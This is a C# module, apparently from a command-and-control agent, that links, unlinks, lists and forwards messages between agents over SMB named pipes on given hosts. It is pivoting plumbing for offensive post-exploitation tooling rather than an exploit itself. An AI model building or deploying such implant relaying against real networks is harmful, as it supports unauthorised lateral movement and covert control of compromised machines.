using Workflow.Contracts;
using Workflow.Models;
using System.Collections.Concurrent;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule, IForwarderModule
    {
        public string Name => "smb";
        private IServiceConfig config { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<string, SmbLink> forwarders =
            new ConcurrentDictionary<string, SmbLink>();

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.config = context.Config;
            this.logger = context.Logger;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            SmbLinkArgs args;
            try
            {
                args = JsonSerializer
                    .Deserialize<SmbLinkArgs>(
                        job.task.parameters);
            }
            catch (JsonException)
            {
                args = null;
            }

            if (args is null)
            {
                DebugLog.Log(
                    $"{Name} invalid parameters [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = job.task.id,
                    user_output = "Invalid parameters.",
                    status = "error",
                    completed = true,
                });
                return;
            }

            DebugLog.Log(
                $"{Name} action={args.action} [{job.task.id}]");

            switch (args.action)
            {
                case "link":
                    await CreateNewLink(args, job.task.id);
                    break;
                case "unlink":
                    await UnlinkAgent(args, job.task.id);
                    break;
                case "list":
                    ListConnections(job);
                    break;
                default:
                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        task_id = job.task.id,
                        user_output =
                            $"Unknown action: {args.action}",
                        status = "error",
                        completed = true,
                    });
                    break;
            }
        }

        public async Task CreateNewLink(
            SmbLinkArgs args, string task_id)
        {
            var link = new SmbLink(
                messageManager, logger, args,
                config.uuid, task_id);

            EdgeResponse result = await link.Link();

            if (result.edges.Count > 0
                && !string.IsNullOrEmpty(link.linked_agent_id))
            {
                this.forwarders.TryAdd(
                    link.linked_agent_id, link);
            }

            this.messageManager.AddTaskResponse(result.ToJson());
        }

        private async Task UnlinkAgent(
            SmbLinkArgs args, string task_id)
        {
            var match = this.forwarders.FirstOrDefault(
                f => f.Value.args.hostname == args.hostname
                    && f.Value.args.pipename == args.pipename);

            if (match.Value == null)
            {
                this.messageManager.AddTaskResponse(
                    new TaskResponse
                    {
                        task_id = task_id,
                        user_output = "Failed to unlink.",
                        status = "error",
                        completed = true,
                    });
                return;
            }

            bool success = await match.Value.Unlink();

            if (success)
            {
                this.forwarders.TryRemove(match.Key, out _);
                this.messageManager.AddTaskResponse(
                    new TaskResponse
                    {
                        task_id = task_id,
                        user_output = "Link removed.",
                        completed = true,
                    });
            }
            else
            {
                this.messageManager.AddTaskResponse(
                    new TaskResponse
                    {
                        task_id = task_id,
                        user_output = "Failed to unlink.",
                        status = "error",
                        completed = true,
                    });
            }
        }

        public async Task ForwardDelegate(DelegateMessage dm)
        {
            DebugLog.Log($"{Name} ForwardDelegate uuid={dm.uuid}");
            var match = this.forwarders.FirstOrDefault(
                a => a.Value.linked_agent_id == dm.uuid
                    || a.Value.linked_agent_id == dm.new_uuid);

            if (match.Value == null)
            {
                return;
            }

            if (!string.IsNullOrEmpty(dm.new_uuid))
            {
                match.Value.linked_agent_id = dm.new_uuid;
            }

            await match.Value.ForwardDelegateMessage(dm);
        }

        public void ListConnections(ServerJob job)
        {
            var linkInfos = this.forwarders
                .Select(kvp => new
                {
                    linked_agent_id = kvp.Value.linked_agent_id,
                    connected = kvp.Value.connected,
                    pipename = kvp.Value.args.pipename,
                    hostname = kvp.Value.args.hostname,
                })
                .ToList();

            this.messageManager.AddTaskResponse(
                new TaskResponse
                {
                    user_output =
                        JsonSerializer.Serialize(linkInfos),
                    task_id = job.task.id,
                    completed = true,
                });
        }
    }
}
